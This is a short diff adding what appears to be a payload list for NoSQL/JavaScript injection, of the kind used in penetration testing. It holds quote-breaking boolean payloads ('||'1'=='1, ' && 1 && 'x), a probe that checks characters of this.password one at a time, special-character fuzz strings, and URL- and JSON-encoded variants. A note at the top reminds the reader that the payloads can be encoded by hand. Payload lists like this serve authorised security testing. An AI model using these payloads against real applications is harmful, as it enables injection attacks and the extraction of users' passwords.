@@ -1,0 +1,27 @@
+## REMEMBER YOU  CAN ENCODE THEM MANUALLY.
+
+' && this.password[0] == 'a' || 'a'=='b
+' && this.password.match(/\d/) || 'a'=='b
+
+'"`{
+'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+
+;$Foo}
+$Foo \xYZ
+'"`{ ;$Foo} $Foo \xYZ
+'%00
+' " \ ; { } ( )
+
+' && 0 && 'x //false statement
+'+%26%26+0+%26%26+'x
+' && 1 && 'x //true statement
+'+%26%26+1+%26%26+'x
+
+'||'1'=='1
+%27%7c%7c%27%31%27%3d%3d%27%31
+
+//url encode
+'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+
+//json encode
+'\"`{\r;$Foo}\n$Foo \\xYZ\u0000.
